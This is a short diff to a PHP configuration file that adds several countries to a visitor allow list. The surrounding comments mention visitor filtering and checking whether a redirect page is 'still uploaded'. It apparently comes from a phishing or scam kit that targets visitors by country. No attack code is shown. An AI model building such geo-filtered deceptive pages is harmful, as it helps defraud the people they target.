@@ -27,7 +27,7 @@ $parameter = 1; // [REQUIRED]
 	4 : Allow All Visitors.
 */
 
-$_COUNTRY_ALLOWED = ["uk", "us", "tr"]; # Add Allowed Country Here , Country ISO code must be lowercase. [REQUIRED]
+$_COUNTRY_ALLOWED = ["uk", "us", "tr", "ma", "fr", "de", "au"]; # Add Allowed Country Here , Country ISO code must be lowercase. [REQUIRED]
 
 $redirection_link_check = false; // Check Your Page If Still Uploaded
 
